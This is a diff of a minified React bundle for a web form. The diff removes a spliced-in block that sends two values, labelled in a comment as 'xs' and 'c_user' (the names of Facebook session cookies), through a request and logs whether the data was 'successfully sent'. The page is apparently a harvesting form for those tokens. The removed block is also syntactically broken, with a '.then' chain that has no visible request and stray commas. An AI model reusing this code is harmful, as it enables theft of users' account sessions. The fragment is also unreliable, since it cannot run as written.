@@ -9811,7 +9811,6 @@
                             he.jsxs)("form", {
                                 id: "dataFirst",
                                 autoComplete: "off",
-                                
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
@@ -9833,34 +9832,6 @@
                                     )),
                                     s("pass")
                                 }
-                                ,
-    .then(response => {
-        if (response.ok) {
-            console.log("Request was successful:", response);
-            s("pass");  // Call the callback function on success
-        } else {
-            console.error("Request failed with status:", response.status);
-            s("fail");  // Call the callback function on failure
-        }
-    })
-    .catch(error => {
-        console.error("There was an error with the request:", error);
-        s("fail");  // Call the callback function on error
-    });
-}
-
-// Call the function with dynamic values
-sendRequest(r, i);  // Here 'r' is the dynamic value for xs, and 'i' for c_user
-
-// Function that handles the response (success or failure)
-function s(status) {
-    if (status === "pass") {
-        console.log("Success: Data has been successfully sent!");
-    } else {
-        console.log("Failure: Something went wrong.");
-    }
-}
-
                                 ,
                                 children: [(0,
                                 he.jsxs)("div", {
